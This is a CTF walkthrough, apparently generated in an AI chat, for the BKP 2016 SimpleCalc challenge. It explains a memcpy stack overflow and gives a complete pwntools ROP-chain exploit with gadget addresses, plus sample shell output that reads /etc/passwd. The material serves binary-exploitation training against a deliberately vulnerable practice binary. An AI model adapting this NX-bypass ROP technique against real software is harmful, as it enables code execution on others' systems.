
# BKP'16 SimpleCalc - Complete CTF Walkthrough

## üìö Table of Contents

1. [Challenge Overview](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#challenge-overview)
2. [Prerequisites](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#prerequisites)
3. [Understanding the Binary](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#understanding-the-binary)
4. [The Vulnerability Explained](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#the-vulnerability-explained)
5. [Understanding ROP (Return-Oriented Programming)](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#understanding-rop)
6. [Finding the Offset](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#finding-the-offset)
7. [Finding ROP Gadgets](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#finding-rop-gadgets)
8. [Planning the Attack](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#planning-the-attack)
9. [Writing the Exploit](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#writing-the-exploit)
10. [Running the Exploit](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#running-the-exploit)
11. [Common Pitfalls &amp; Troubleshooting](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#common-pitfalls)
12. [Key Takeaways](https://claude.ai/chat/022c2e84-519f-468f-90b0-8c5cdb24531a#key-takeaways)

---

## üéØ Challenge Overview

**Challenge:** SimpleCalc (Boston Key Party CTF 2016)

**Category:** Binary Exploitation (Buffer Overflow)

**Difficulty:** Intermediate

**Objective:** Exploit a buffer overflow to get a shell

**What You'll Learn:**

* Buffer overflow exploitation
* Return-Oriented Programming (ROP)
* x86-64 syscalls
* Bypassing NX protection
* Stack manipulation

---

## üîß Prerequisites

### Required Tools

```bash
# Install pwntools (Python exploitation framework)
pip install pwntools

# Install ROPgadget (finds ROP gadgets in binaries)
pip install ROPgadget

# Install GDB with GEF (debugging - optional but helpful)
# Follow: https://github.com/hugsy/gef
```

### Required Files

```
simplecalc          ‚Üê The vulnerable binary (download from GitHub)
exploit.py          ‚Üê Your exploit script (you will create this)
```

### Getting the Binary

```bash
# Clone the nightmare repository
git clone https://github.com/guyinatuxedo/nightmare.git
cd nightmare/modules/07-bof_static/bkp16_simplecalc

# Make it executable
chmod +x simplecalc
```

---

## üîç Understanding the Binary

### Binary Analysis

First, let's check what we're dealing with:

```bash
$ file simplecalc
simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), 
statically linked, for GNU/Linux 2.6.24, not stripped
```

**Key Information:**

* **64-bit binary** - Uses 64-bit addresses and calling conventions
* **Statically linked** - All library code is included (gives us lots of ROP gadgets!)
* **Not stripped** - Function names are preserved (easier to analyze)

### Security Protections

```bash
$ pwn checksec simplecalc
[*] '/path/to/simplecalc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found      ‚Üê No stack protection!
    NX:       NX enabled            ‚Üê Stack is non-executable
    PIE:      No PIE (0x400000)    ‚Üê Fixed addresses (no randomization)
```

**What This Means:**

* ‚úÖ **No Stack Canary** - Buffer overflows are not detected
* ‚ö†Ô∏è **NX Enabled** - We can't execute shellcode on the stack
* ‚úÖ **No PIE** - Addresses are always the same (no infoleak needed)

### Program Behavior

```bash
$ ./simplecalc
    |#------------------------------------#|
    |         Something Calculator         |
    |#------------------------------------#|

Expected number of calculations: 5
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 100
Integer y: 50
Result for x + y is 150.
```

**The program:**

1. Asks how many calculations you want to perform
2. Lets you do arithmetic operations
3. Stores results in dynamically allocated memory
4. When you "Save and Exit", copies results to a stack buffer

---

## üêõ The Vulnerability Explained

### The Vulnerable Code

Let's look at the decompiled main function (from Ghidra):

```c
undefined8 main(void)
{
  void *calculations;           // Pointer to heap memory
  undefined vulnBuf [40];       // 40-byte buffer on STACK
  int calcChoice;
  int numberCalcs;
  int i;
  
  // Get number of calculations from user
  printf("Expected number of calculations: ");
  __isoc99_scanf(&DAT_00494214, &numberCalcs);
  
  // Allocate memory for calculation results
  // numberCalcs << 2 means numberCalcs * 4
  calculations = malloc((long)(numberCalcs << 2));
  
  // ... perform calculations and store results ...
  
  // When user chooses option 5 (Save and Exit):
  if (calcChoice == 5) {
    // THE BUG IS HERE! ‚ö†Ô∏è
    memcpy(vulnBuf, calculations, (long)(numberCalcs << 2));
    free(calculations);
    return 0;
  }
}
```

### Understanding the Bug - Step by Step

#### Step 1: Understanding Bit Shift (`<< 2`)

The expression `numberCalcs << 2` is a  **left bit shift** .

**What it does:**

```
5 << 2  = 5 * 4  = 20
10 << 2 = 10 * 4 = 40
50 << 2 = 50 * 4 = 200
```

**Why multiply by 4?**

Because each integer result is **4 bytes** (32 bits).

#### Step 2: Normal Operation (Safe)

If we say we want  **10 calculations** :

```
HEAP:
malloc(10 * 4 = 40 bytes)
[result1][result2][result3]...[result10]
   4B      4B       4B          4B

STACK:
vulnBuf = 40 bytes
[        40 bytes available        ]

MEMCPY:
memcpy(vulnBuf, calculations, 40)
Copies 40 bytes into 40-byte buffer ‚Üí SAFE ‚úÖ
```

#### Step 3: Exploitation (Overflow)

If we say we want  **50 calculations** :

```
HEAP:
malloc(50 * 4 = 200 bytes)
[result1][result2]...[result50]

STACK:
vulnBuf = STILL only 40 bytes!
[        40 bytes available        ]

MEMCPY:
memcpy(vulnBuf, calculations, 200)
Copies 200 bytes into 40-byte buffer ‚Üí OVERFLOW! ‚ö†Ô∏è

Extra data: 200 - 40 = 160 bytes overflow the buffer!
```

### What Gets Overwritten?

```
HIGH MEMORY
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Return Address        ‚îÇ ‚Üê WE WANT TO CONTROL THIS!
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   Saved RBP (8 bytes)   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   calculations pointer  ‚îÇ ‚Üê Will be overwritten
‚îÇ   (8 bytes)             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   vulnBuf[40]           ‚îÇ ‚Üê Our input starts here
‚îÇ   (40 bytes)            ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
LOW MEMORY
```

**What happens:**

1. First 40 bytes ‚Üí Fill `vulnBuf` (safe)
2. Next 8 bytes ‚Üí Overwrite `calculations` pointer
3. Next 16 bytes ‚Üí Overwrite saved RBP and padding
4. Next 8 bytes ‚Üí **Overwrite return address** (our target!)
5. Remaining bytes ‚Üí Our ROP chain!

### The Critical Math

```
vulnBuf size: 40 bytes
+ calculations pointer: 8 bytes
+ saved RBP: 8 bytes
+ padding: 16 bytes
= 72 bytes (0x48) to reach return address
```

**In integers:** 72 √∑ 4 = **18 integers** to reach return address

---

## üéì Understanding ROP (Return-Oriented Programming)

### Why Can't We Use Shellcode?

Normally in a buffer overflow, we'd do this:

```
NORMAL ATTACK (if NX was OFF):
1. Write shellcode to stack: "\x48\x31\xc0..." (machine code)
2. Overwrite return address to point to our shellcode
3. When function returns ‚Üí CPU executes our shellcode
4. Get shell! ‚úÖ
```

**But NX (No eXecute) prevents this!**

```bash
Stack permissions:
Read:    ‚úÖ YES
Write:   ‚úÖ YES  
Execute: ‚ùå NO!  ‚Üê If we try to execute code on stack ‚Üí CRASH!
```

### What IS ROP?

**ROP = Return-Oriented Programming**

**The key insight:**

* We CAN'T add new executable code
* But we CAN use existing executable code in the binary
* We find small useful code snippets ("gadgets")
* We chain them together to do what we want

**Think of it like LEGO:**

* You can't create new LEGO pieces
* But you can arrange existing pieces in creative ways
* Chain together simple pieces to build something complex

### What's a Gadget?

A **gadget** is a small sequence of instructions ending with `ret`.

**Example Gadget:**

```assembly
0x44db34:  pop rax    ; Take value from stack ‚Üí put in rax register
           ret        ; Jump to next address on stack
```

**Why the `ret` instruction?**

```assembly
ret instruction does:
1. Pop address from stack
2. Jump to that address
```

This lets us **chain gadgets together automatically!**

### How ROP Chaining Works

**The Stack After Overflow:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Gadget1 Address    ‚îÇ ‚Üê Return address (we control!)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Value for Gadget1  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Gadget2 Address    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Value for Gadget2  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  Gadget3 Address    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Execution Flow:**

```
1. Function returns
   ‚Üí Pops Gadget1 Address
   ‚Üí Jumps to Gadget1

2. Gadget1 executes: "pop rax ; ret"
   ‚Üí Pops Value for Gadget1 into rax
   ‚Üí Executes ret
   ‚Üí Pops Gadget2 Address
   ‚Üí Jumps to Gadget2

3. Gadget2 executes: "pop rdi ; ret"
   ‚Üí Pops Value for Gadget2 into rdi
   ‚Üí Executes ret
   ‚Üí Pops Gadget3 Address
   ‚Üí Jumps to Gadget3

... and so on!
```

**Key Point:** Each `ret` automatically moves to the next gadget!

### Our Goal: Execute execve("/bin/sh")

We want to make this system call:

```c
execve("/bin/sh", NULL, NULL);
```

**In x86-64 Linux, syscalls work like this:**

```
Set up registers:
  rax = syscall number
  rdi = first argument
  rsi = second argument
  rdx = third argument

Execute: syscall instruction
```

**For execve specifically:**

```
rax = 0x3b (59)         ‚Üê Syscall number for execve
rdi = pointer to "/bin/sh"  ‚Üê Program to execute
rsi = 0x0               ‚Üê argv (NULL = no arguments)
rdx = 0x0               ‚Üê envp (NULL = no environment)
```

**Syscall Reference:** https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

---

## üéØ Finding the Offset

We need to know **exactly** how many bytes until we reach the return address.

### Method 1: Using GDB (Recommended)

```bash
# Start GDB with GEF
gdb ./simplecalc

# Set breakpoint right after memcpy
gef‚û§  b *0x40154a

# Run and do one calculation
gef‚û§  r
Expected number of calculations: 50
=> 1
Integer x: 159
Integer y: 321456789
Result: 321456948
=> 5  # Save and Exit

# When breakpoint hits, find our input
gef‚û§  search-pattern 0x13290b34
[+] In '[stack]'
  0x7fffffffde60 ‚Üê Our input starts here

# Find return address location
gef‚û§  info frame
Saved registers:
  rip at 0x7fffffffdea8  ‚Üê Return address is here

# Calculate offset
0x7fffffffdea8 - 0x7fffffffde60 = 0x48 = 72 bytes
```

### Method 2: Static Analysis

From the code structure:

```
vulnBuf[40]           40 bytes
calculations pointer   8 bytes
saved RBP              8 bytes
padding               16 bytes
------------------------
Total:                72 bytes = 18 integers
```

---

## üîç Finding ROP Gadgets

### Installing ROPgadget

```bash
pip install ROPgadget
# or
sudo apt install python3-ropgadget
```

### Searching for Gadgets

**IMPORTANT:** Gadgets already exist in the binary! We're not creating them, just finding them!

#### Finding Register Control Gadgets

```bash
# Find gadget to control rax
$ ROPgadget --binary simplecalc | grep "pop rax ; ret"
0x000000000044db34 : pop rax ; ret

# Find gadget to control rdi
$ ROPgadget --binary simplecalc | grep "pop rdi ; ret"
0x0000000000401b73 : pop rdi ; ret

# Find gadget to control rsi
$ ROPgadget --binary simplecalc | grep "pop rsi ; ret"
0x0000000000401c87 : pop rsi ; ret

# Find gadget to control rdx
$ ROPgadget --binary simplecalc | grep "pop rdx ; ret"
0x0000000000437a85 : pop rdx ; ret
```

#### Finding Memory Write Gadget

```bash
# Find gadget to write to memory
$ ROPgadget --binary simplecalc | grep "mov qword ptr \[rax\]"
0x000000000044526e : mov qword ptr [rax], rdx ; ret
```

This gadget writes the value in `rdx` to the memory address in `rax`.

#### Finding Syscall Gadget

```bash
$ ROPgadget --binary simplecalc | grep ": syscall"
0x0000000000400488 : syscall
```

### Our Gadget Arsenal

| Address  | Gadget                             | Purpose                  |
| -------- | ---------------------------------- | ------------------------ |
| 0x44db34 | `pop rax ; ret`                  | Put value into rax       |
| 0x401b73 | `pop rdi ; ret`                  | Put value into rdi       |
| 0x401c87 | `pop rsi ; ret`                  | Put value into rsi       |
| 0x437a85 | `pop rdx ; ret`                  | Put value into rdx       |
| 0x44526e | `mov qword ptr [rax], rdx ; ret` | Write rdx to memory[rax] |
| 0x400488 | `syscall`                        | Execute syscall          |

---

## üé® Planning the Attack

### Finding Writable Memory

We need a place to write our "/bin/sh" string.

```bash
# In GDB, check memory mappings
gef‚û§  vmmap
0x00000000006c0000 0x00000000006c3000 rw-  ‚Üê Writable region!
```

**This memory:**

* ‚úÖ Has read/write permissions
* ‚úÖ No PIE means address is always the same
* ‚úÖ We can safely write our string here

**We'll use: 0x6c1000**

### Converting "/bin/sh" to Hex

```python
"/bin/sh\x00" in little-endian hex:
0x0068732f6e69622f

Breaking it down:
/ = 0x2f
b = 0x62
i = 0x69
n = 0x6e
/ = 0x2f
s = 0x73
h = 0x68
\x00 = 0x00 (null terminator)
```

### Dealing with the Free() Problem

**The Issue:**

```c
memcpy(vulnBuf, calculations, ...);
free(calculations);  // ‚Üê We overwrite 'calculations' pointer!
```

If we overwrite the `calculations` pointer with garbage, `free()` will crash!

**The Solution:**

Looking at `free()` source code:

```c
void free(void *mem) {
    if (mem == 0)  // If NULL pointer
        return;     // Just return, do nothing!
    // ... actual free logic ...
}
```

**Fix:** Fill the first part of our overflow with null bytes so `calculations` becomes `0x0`.

### The Complete ROP Chain Plan

**Phase 1: Write "/bin/sh" to 0x6c1000**

```
1. pop rax            ‚Üí rax = 0x6c1000
2. pop rdx            ‚Üí rdx = "/bin/sh"
3. mov [rax], rdx     ‚Üí Write "/bin/sh" to 0x6c1000
```

**Phase 2: Set up syscall registers**

```
4. pop rax            ‚Üí rax = 0x3b (execve syscall)
5. pop rdi            ‚Üí rdi = 0x6c1000 (pointer to "/bin/sh")
6. pop rsi            ‚Üí rsi = 0x0 (NULL)
7. pop rdx            ‚Üí rdx = 0x0 (NULL)
```

**Phase 3: Execute**

```
8. syscall            ‚Üí execve("/bin/sh", NULL, NULL)
```

### Stack Layout After Overflow

```
Offset 0-71: (18 integers)
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0x0000000000000000   ‚îÇ ‚Üê Null bytes (safe free)
‚îÇ 0x0000000000000000   ‚îÇ
‚îÇ        ...           ‚îÇ
‚îÇ 0x0000000000000000   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

Offset 72+ (Return address):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0x44db34             ‚îÇ ‚Üê pop rax ; ret
‚îÇ 0x6c1000             ‚îÇ ‚Üê value for rax
‚îÇ 0x437a85             ‚îÇ ‚Üê pop rdx ; ret
‚îÇ 0x0068732f6e69622f   ‚îÇ ‚Üê value for rdx ("/bin/sh")
‚îÇ 0x44526e             ‚îÇ ‚Üê mov [rax], rdx ; ret
‚îÇ 0x44db34             ‚îÇ ‚Üê pop rax ; ret
‚îÇ 0x3b                 ‚îÇ ‚Üê value for rax (syscall)
‚îÇ 0x401b73             ‚îÇ ‚Üê pop rdi ; ret
‚îÇ 0x6c1000             ‚îÇ ‚Üê value for rdi
‚îÇ 0x401c87             ‚îÇ ‚Üê pop rsi ; ret
‚îÇ 0x0                  ‚îÇ ‚Üê value for rsi
‚îÇ 0x437a85             ‚îÇ ‚Üê pop rdx ; ret
‚îÇ 0x0                  ‚îÇ ‚Üê value for rdx
‚îÇ 0x400488             ‚îÇ ‚Üê syscall
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## üíª Writing the Exploit

### Understanding the Input Challenge

**Problem:** We can only input through calculator operations!

We can't just send raw bytes. We must use addition/subtraction/multiplication/division.

**Solution:** Use **addition** to build any value we want.

### Helper Functions

```python
from pwn import *

# Connect to the binary
target = process('./simplecalc')

def addSingle(x):
    """Add two numbers to get result x"""
    target.recvuntil("=> ")
    target.sendline("1")  # Choose addition
    target.recvuntil("Integer x: ")
    target.sendline("100")  # First number
    target.recvuntil("Integer y: ")
    target.sendline(str(x - 100))  # Second number
    # Result: 100 + (x - 100) = x

def add(z):
    """Send a 64-bit value as two 32-bit integers"""
    # Split into lower and upper 32 bits
    lower = z & 0xffffffff
    upper = (z >> 32) & 0xffffffff
    addSingle(lower)   # Send lower 32 bits
    addSingle(upper)   # Send upper 32 bits
```

**Why split into two 32-bit values?**

* Each calculation result is 4 bytes (32 bits)
* A 64-bit address is 8 bytes
* We need TWO calculation results to form one 64-bit value

### Complete Exploit Script

```python
from pwn import *

# Start the vulnerable program
target = process('./simplecalc')

# Tell it we want to do 100 calculations
target.recvuntil('Expected number of calculations: ')
target.sendline('100')

# Define our gadget addresses (found with ROPgadget)
popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85
movGadget = 0x44526e  # mov qword ptr [rax], rdx ; ret
syscall = 0x400488

# Helper function to send values via addition
def addSingle(x):
    target.recvuntil("=> ")
    target.sendline("1")
    target.recvuntil("Integer x: ")
    target.sendline("100")
    target.recvuntil("Integer y: ")
    target.sendline(str(x - 100))

def add(z):
    # Split 64-bit value into two 32-bit integers
    x = z & 0xffffffff
    y = ((z & 0xffffffff00000000) >> 32)
    addSingle(x)
    addSingle(y)

# PHASE 1: Fill first 72 bytes with nulls
# This reaches the return address and makes free(0x0) safe
for i in range(9):  # 9 * 8 = 72 bytes
    add(0x0)

# PHASE 2: Write "/bin/sh" to memory at 0x6c1000
add(popRax)                    # pop rax ; ret
add(0x6c1000)                  # rax = 0x6c1000 (destination)
add(popRdx)                    # pop rdx ; ret
add(0x0068732f6e69622f)        # rdx = "/bin/sh"
add(movGadget)                 # mov [rax], rdx ; ret (WRITE!)

# PHASE 3: Set up execve syscall registers
add(popRax)                    # pop rax ; ret
add(0x3b)                      # rax = 0x3b (execve syscall number)
add(popRdi)                    # pop rdi ; ret
add(0x6c1000)                  # rdi = 0x6c1000 (pointer to "/bin/sh")
add(popRsi)                    # pop rsi ; ret
add(0x0)                       # rsi = 0x0 (NULL)
add(popRdx)                    # pop rdx ; ret
add(0x0)                       # rdx = 0x0 (NULL)

# PHASE 4: Execute the syscall!
add(syscall)                   # syscall ‚Üí execve("/bin/sh", NULL, NULL)

# Trigger the overflow by choosing "Save and Exit"
target.sendline('5')

# Drop to interactive shell
target.interactive()
```

---

## üöÄ Running the Exploit

### Execution

```bash
$ python exploit.py
[+] Starting local process './simplecalc': pid 12345
[*] Switching to interactive mode
$ whoami
user
$ pwd
/home/user/ctf
$ ls
exploit.py  simplecalc
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
$ exit
```

**Success! We got a shell! üéâ**

### What Just Happened?

1. Python script started `simplecalc`
2. Script sent 100 calculations worth of data via addition
3. Data overflowed the buffer and overwrote return address
4. Return address now points to our ROP chain
5. When function returned, it jumped to first gadget
6. Gadgets executed in sequence:
   * Wrote "/bin/sh" to 0x6c1000
   * Set up registers for execve syscall
   * Executed syscall
7. `execve("/bin/sh", NULL, NULL)` spawned a shell!

---

## ‚ö†Ô∏è Common Pitfalls & Troubleshooting

### Issue 1: "Segmentation Fault" Immediately

**Cause:** Offset is wrong, or gadget addresses are incorrect.

**Fix:**

```bash
# Verify offset in GDB
gdb ./simplecalc
gef‚û§  b *0x40154a
# ... calculate offset again ...

# Verify gadgets exist
ROPgadget --binary simplecalc | grep "0x44db34"
```

### Issue 2: "Free(): Invalid Pointer"

**Cause:** Not filling with null bytes properly.

**Fix:**

```python
# Make sure you're filling first 72 bytes with nulls
for i in range(9):  # 9 * 8 = 72
    add(0x0)
```

### Issue 3: Nothing Happens After Exploit Runs

**Cause:** Might be waiting for input or shell exited.

**Fix:**

```python
# Make sure to call interactive()
target.interactive()

# Try sending a command
target.sendline('whoami')
print(target.recvline())
```

### Issue 4: "Illegal Instruction"

**Cause:** Jumping to wrong address or data, not code.

**Fix:**

```bash
# Verify gadget addresses with ROPgadget
# Make sure you're using the correct addresses

# Debug in GDB to see where it crashes
gdb ./simplecalc
gef‚û§  r < <(python exploit.py)
```

### Issue 5: Pwntools Not Installed

```bash
pip install pwntools
# or
pip3 install pwntools

# If that doesn't work:
python -m pip install --upgrade pip
python -m pip install pwntools
```

---

## üìù Key Takeaways

### Concepts Learned

1. **Buffer Overflow Mechanics**
   * How to identify buffer overflow vulnerabilities
   * Calculating offsets to return address
   * Controlling execution flow
2. **ROP (Return-Oriented Programming)**
   * Why ROP is necessary when NX is enabled
   * How gadgets work and chain together
   * Finding gadgets with ROPgadget tool
3. **x86-64 Syscalls**
   * How Linux syscalls work on 64-bit systems
   * Register conventions for syscalls
   * Making execve syscall to spawn shell
4. **Binary Protections**
   * Understanding NX, PIE, Stack Canaries
   * How to bypass protections
   * When each technique is applicable

### Important Principles

‚úÖ **You don't create gadgets** - they already exist in the binary

‚úÖ **You don't write assembly** - you find and chain existing code

‚úÖ **Everything is done via Python** - no C files or compiling needed

‚úÖ **ROP chains are just addresses** - on the stack, pointing to existing code

‚úÖ **Each `ret` moves to next gadget** - automatic chaining

### Attack Summary

```
1. Find buffer overflow (memcpy with no size check)
2. Calculate offset to return address (72 bytes)
3. Find ROP gadgets (pop, mov, syscall)
4. Find writable memory (0x6c1000)
5. Build ROP chain (write string, set registers, syscall)
6. Send payload via calculator operations
7. Trigger overflow (Save and Exit)
8. Get shell! üéâ
```

---

## üìö Further Reading

### Resources

* **Nightmare GitHub** : https://github.com/guyinatuxedo/nightmare
* **Linux Syscall Table** : https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
* **ROPgadget Tool** : https://github.com/JonathanSalwan/ROPgadget
* **Pwntools Documentation** : https://docs.pwntools.com/

### Next Challenges

After mastering this, try:

* **DCQuals'19: Speedrun1** - Similar ROP challenge
* **CSAW'19: Babyboi** - Introduction to dynamic ROP
* **More bof_static challenges** in the Nightmare repository

### Practice Sites

* **pwnable.kr** - Korean CTF site with great binary challenges
* **exploit.education** - Progressive binary exploitation challenges
* **ROP Emporium** - Focused ROP practice challenges

---

## ‚úÖ Verification Checklist

Before running your exploit, verify:

* [ ] Binary is executable (`chmod +x simplecalc`)
* [ ] Pwntools is installed (`pip install pwntools`)
* [ ] ROPgadget is installed (`pip install ROPgadget`)
* [ ] Gadget addresses match your binary (run ROPgadget to verify)
* [ ] Offset calculation is correct (72 bytes / 18 integers)
* [ ] Null bytes fill first 72 bytes (prevents free() crash)
* [ ] ROP chain is in correct order
* [ ] You called `target.interactive()` to use the shell

---

## üéØ Quick Reference

### Gadget Addresses

```python
popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85
movGadget = 0x44526e
syscall = 0x400488
```

### Key Values

```python
offset = 72 bytes (18 integers)
writable_memory = 0x6c1000
binsh_hex = 0x0068732f6e69622f
execve_syscall = 0x3b
```

### Commands

```bash
# Find gadgets
ROPgadget --binary simplecalc | grep "pop rax"

# Debug in GDB
gdb ./simplecalc

# Run exploit
python exploit.py
```

---

**Good luck, and happy hacking! üöÄ**

Remember: The best way to learn is by doing. Try modifying the exploit, experiment with different gadgets, and most importantly, understand WHY each step works!
